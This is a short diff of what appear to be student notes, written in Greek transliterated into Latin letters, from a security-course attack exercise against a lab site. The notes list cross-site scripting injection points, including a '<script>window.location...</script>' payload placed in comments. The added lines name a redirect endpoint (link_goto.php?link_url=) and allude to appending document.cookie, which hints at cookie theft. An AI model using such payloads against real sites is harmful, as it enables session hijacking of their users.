@@ -128,3 +128,5 @@ opws kai se ola ta shmeia xss
 http://the-intruders.csec.chatzi.org/modules/conference/conference.php
 vazw se sxolia to <script>window.location...</script>
 
+the-intruders.csec.chatzi.org/modules/link/link_goto.php?link_url=
+put link (no +document.cookie)
